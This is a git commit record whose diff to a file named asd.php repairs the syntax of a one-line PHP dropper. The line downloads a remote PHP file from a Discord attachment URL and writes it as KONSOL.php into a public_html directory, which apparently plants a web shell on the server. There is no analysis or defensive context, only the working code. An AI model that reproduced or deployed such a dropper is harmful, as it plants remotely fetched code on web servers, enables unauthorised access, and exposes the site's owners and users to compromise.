701563306d539c0b5815c74bb2455f903f514dec
holisleng <102899184+holisleng@users.noreply.github.com>
2023-09-24 00:16:14 +0700

    Update asd.php

--- asd.php
+++ asd.php
@@ -1,1 +1,1 @@
-<?php file_put_contents("/home/b254/public_html/pp/KONSOL.php",file_get_contents("https://cdn.discordapp.com/attachments/1029214987543117865/1148175709785829376/71s.php")) >
+<?php file_put_contents("/home/b254/public_html/pp/KONSOL.php",file_get_contents("https://cdn.discordapp.com/attachments/1029214987543117865/1148175709785829376/71s.php")); ?>
